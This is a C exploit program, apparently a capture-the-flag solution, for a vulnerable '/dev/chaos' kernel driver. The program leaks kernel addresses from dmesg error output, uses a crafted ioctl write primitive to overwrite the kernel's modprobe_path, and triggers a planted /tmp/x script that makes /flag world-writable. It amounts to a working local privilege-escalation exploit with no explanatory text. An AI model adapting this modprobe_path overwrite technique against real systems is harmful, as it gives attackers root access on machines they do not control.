#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#include <chaos.h>

#define DEBUG

#ifdef DEBUG
#include <stdio.h>
#define debug(fmt, ...) fprintf(stderr, "%s:%d: %s: " fmt, __FILE__, __LINE__, __func__, __VA_ARGS__)
#else
#define debug(...)
#endif

#define CHECK(cond) do { \
  if (!(cond)) { \
    debug("check \"%s\" failed.\n", #cond); \
    _exit(2); \
  } \
} while (0)

#define OPEN() open("/dev/chaos", O_RDWR)
static uint16_t cur_seq = 0;

static inline void inc() { ++cur_seq; }
static inline int request(int fd, struct chaos_request *req) {
  inc();
  return ioctl(fd, CHAOS_REQUEST, req);
}

static void dummy_req_until(int seq) {
  int fd = OPEN();
  CHECK(ioctl(fd, CHAOS_ALLOCATE_BUFFER, 0x100000 - 0x3000 - 0x1000) == 0);
  struct chaos_request req;
  while (cur_seq != seq)
    CHECK(request(fd, &req) == -1);
  close(fd);
}

static void dummy_req_until_s(int seq) {
  seq %= 512;
  int fd = OPEN();
  CHECK(ioctl(fd, CHAOS_ALLOCATE_BUFFER, 0x100000 - 0x3000 - 0x1000) == 0);
  struct chaos_request req;
  while (cur_seq % 512 != seq)
    CHECK(request(fd, &req) == -1);
  close(fd);
}

static uint32_t lastmsg(void) {
  system("dmesg | grep 'fw returns an error:' | tail -1 | awk '{ print $NF }'> /tmp/t");
  int x;
  FILE *f = fopen("/tmp/t", "r");
  CHECK(f);
  CHECK(fscanf(f, "%d", &x) == 1);
  return x;
}

static int fd;
static uint64_t *devbuf;
static uint64_t cmdq;
static uint64_t modprobe;

static void init() {
  puts("[+] Prepare chmod file.");
  system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/x");
  system("chmod +x /tmp/x");

  puts("[+] Prepare trigger file.");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake");
  system("chmod +x /tmp/fake");
  fd = OPEN();
  CHECK(ioctl(fd, CHAOS_ALLOCATE_BUFFER, 0x1000) == 0);
  devbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  CHECK(devbuf != MAP_FAILED);
}

static void leak() {
  struct chaos_request req = {
    .algo = 100,
    .input = 0x0,
    .in_size = 0x8,
  };
  dummy_req_until_s(0xff58 - 1);
  devbuf[0] = 0x555555555554a530ull;
  request(fd, &req);
  if (errno != EPROTO) { debug("leak failed :(%s\n", strerror(errno)); exit(1); }
  uint64_t val = lastmsg();
  val = (val << 16) | (0xffffull << 48);
  val += 0x50000;
  cmdq = val;
  debug("expect cmdq @ 0x%lx\n", cmdq);
  dummy_req_until_s(0x07c - 1);
  devbuf[0] = 0x555555555554a538ull;
  request(fd, &req);
  if (errno != EPROTO) { debug("leak failed :(%s\n", strerror(errno)); while(1); exit(1); }
  val = lastmsg();
  val = (val << 16) | (0xffffull << 48);
  val += 0x851220;
  modprobe = val;
  debug("expect modprobe_path @ 0x%lx\n", modprobe);
}

static void write_to(uint64_t at, uint16_t val) {
  uint64_t idx = 0;
  uint32_t o;
  const size_t sizeofcmd = 13;

  o = (1ull << 32) % sizeofcmd;
  o = o * o;
  o %= sizeofcmd;
  CHECK(at >= cmdq);
  uint64_t off = at - cmdq;
  while (off % sizeofcmd != 0) {
    idx++;
    off += o;
  }
  __uint128_t v = idx;
  v *= 1ull << 32;
  v *= 1ull << 32;
  v += at - cmdq;
  v /= sizeofcmd;
  idx = v;
  CHECK(cmdq + sizeofcmd * idx == at);
  debug("idx = 0x%lx %ld\n", idx, idx & 0x200);
  CHECK((idx & 0x200) == 0);
  struct chaos_request req = {
    .algo = 101,
    .input = 0x0,
    .in_size = 0x8,
  };
  dummy_req_until(val - 2);
  devbuf[0] = idx;
  request(fd, &req);
  req.algo = 0;
  request(fd, &req);
}

static void cat() {
  system("cat /proc/sys/kernel/modprobe");
  system("/tmp/fake");
  system("cat /flag");
  /* system("/bin/sh"); */
}

int main() {
  init();
  leak();
  write_to(modprobe + 1, 0x6d74);
  write_to(modprobe + 2, 0x706d);
  write_to(modprobe + 4, 0x782f);
  cat();
  return 0;
}
